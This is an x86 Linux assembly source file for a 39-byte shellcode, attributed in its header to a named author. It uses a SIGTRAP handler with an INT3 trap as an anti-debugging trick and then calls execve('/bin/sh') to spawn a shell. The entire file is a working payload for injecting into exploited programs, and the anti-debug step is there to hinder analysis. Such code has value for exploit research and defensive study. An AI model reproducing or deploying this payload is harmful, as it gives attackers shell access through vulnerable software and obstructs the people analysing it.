#
# (linux/x86) anti-debug trick (INT 3h trap) + execve("/bin/sh", ["/bin/sh", NULL], NULL) - 39 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0x30
		popl %eax
		push $0x5
		popl %ebx
		jmp _evil_code

	_evilcode_loc:

		popl %ecx
		int $0x80

		int3

		incl %eax

	_evil_code:

		call _evilcode_loc
		cdq
                movb $0xb, %al
                push %edx
                push $0x68732f2f
                push $0x6e69622f
                mov %esp,%ebx
                push %edx
                push %ebx
		pushl %esp
		jmp _evilcode_loc

